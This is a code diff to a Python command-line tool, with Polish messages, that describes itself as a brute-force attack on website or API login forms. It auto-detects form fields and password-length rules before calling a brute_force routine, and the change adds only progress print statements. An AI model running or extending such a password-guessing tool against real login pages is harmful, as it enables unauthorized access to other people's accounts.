@@ -4,7 +4,8 @@ from src.brute import brute_force
 from bs4 import BeautifulSoup
 import requests
 
-def main():
+def main(): 
+    print(">>> Program wystartował! Przetwarzam argumenty...")  # NOWY PRINT
     parser = argparse.ArgumentParser(description="Brute-force atak na stronę WWW lub API (automatyczne wykrywanie pól formularza).")
     parser.add_argument('--target-url', required=True, help='Adres URL formularza logowania')
     parser.add_argument('--username', required=True, help='Login użytkownika')
@@ -19,17 +20,23 @@ def main():
     parser.add_argument('--submit-field', help='Nazwa pola/przycisku submit (opcjonalnie)')
     args = parser.parse_args()
 
-    # Automatyczne wykrywanie pól
+    print(f"URL: {args.target_url}")
+    print("Automatycznie wykrywam pola formularza...")
     form_info = guess_login_form(args.target_url)
+    print(f"Znaleziono pola: {form_info}")
+
     minlen, maxlen = 4, 12
     if args.min_length and args.max_length:
         minlen, maxlen = args.min_length, args.max_length
+        print(f"Używam długości hasła z argumentów: min={minlen}, max={maxlen}")
     else:
-        # Pobierz reguły hasła z formularza
+        print("Pobieram reguły hasła z formularza...")
         r = requests.get(args.target_url, timeout=8)
         soup = BeautifulSoup(r.text, "lxml")
         minlen, maxlen = guess_password_rules(soup, form_info["password_field"])
+        print(f"Reguły hasła z formularza: min={minlen}, max={maxlen}")
 
+    print(f"Start brute-force! login={args.username}, minlen={minlen}, maxlen={maxlen}")
     brute_force(
         url=args.target_url,
         username=args.username,
